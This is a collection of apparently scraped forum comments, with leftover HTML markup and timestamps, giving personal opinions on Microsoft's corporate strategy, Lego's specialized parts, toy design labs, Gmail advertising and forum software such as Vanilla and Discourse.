They can't have the computing monopoly they used to, so they really need to focus on what they're strong at: corporate software. And that is <i>not</i> a bad thing.<p>How about marketing Surface as a solution to corporate IT departments trying to wrestle iPads into their Microsoft ecosystem? Windows Phone could be the same. They could be the Blackberry of the new mobile corporate strategies. Then just keep doing what they do best: build products that plug and play very, very nicely with the rest of Microsoft's portfolio, and offer better corporate support for those products.<p>Instead of trying to figure out how to make a slicker Metro, how about making Sharepoint suck less? Keep the direction of VS going forward. Microsoft's ""next big things"" should be focused on innovating the corporate workspace. Stop trying to get tangled up in the Apple/Google wars and start focusing on challenging things like Google Docs, Box, and Red Hat instead. Those are Microsoft's real competitors.<p>It seems like they're very conflicted and confused about who they are supposed to be. They're not the cool new unproven software maker.

That, and the effort they went to to service small, local stores. It's both amazing and depressing; obviously it doesn't scale at all, but it really sounds like a kickass corporate culture. Wired had a similar article about people who design Nerf guns; they also had an amazing lab-area dedicated to cobbling together new toys[2].<p>My point being, toy-making sounds like an awesome job.

The real criticism of lego is that it's gone from being a collection of parts that can make the thing on the cover of the box but also many interesting variations, to something that isn't very malleable.<p>First, lego no longer has a consistent color scheme, so only pieces from one genre go with other pieces of that genre.<p>Next, there's the proliferation of zany specialized parts. I remember getting a lego cargo ship as a kid (the hull was four specialized pieces  bow, stern, and two mid sections and thinking this was awful.

The same reasoning applies to Linux - if Linux ever becomes a significant corporate desktop OS and LibreOffice becomes a threat to Office, Microsoft's value proposition starts to be questioned.

Microsoft is more of the same - maybe marginally better in one respect (allowing opt-out) but atrocious in many others - almost every article I've seen has had no trouble balancing the story with talk of Microsoft's past transgressions.<p>On the flip side, I agree that Google should allow you to opt out of this, but it's pretty easy to use any email client  to access your gmail e.g. Thunderbird, Apple Mail, even (<i>shudders</i>) Outlook / Outlook Express<p>So the only thing those ads are actually paying for are Google's UI.",1360238742

If Jeff wants to release a decent forum application, he should look to Vanilla for inspiration: <a href=""http://vanillaforums.org/"" rel=""nofollow"">http://vanillaforums.org/</a>  in my opinion, Vanilla is probably the cleanest and best forum application out there today. PHPBB and MyBB feel horribly dated and vBulletin is expensive and looks like it hasn't been updated in about 15 years.<p>The forum market is ripe for disruption on the same scale Wordpress disrupted the CMS market, fancy Javascript is not enough to disrupt the market. I personally find infinite scrolling to be buggy and highly annoying when you're scrolling and trying to read text, then BAM! scrollbar gets longer and the page jumps.<p>Simplicity is the key, not a large number of features and copious amounts of Javascript unnecessarily added in. Discourse as it currently stands doesn't impress me on the same scale Stack Overflow did at least not in its current form.",1360238497
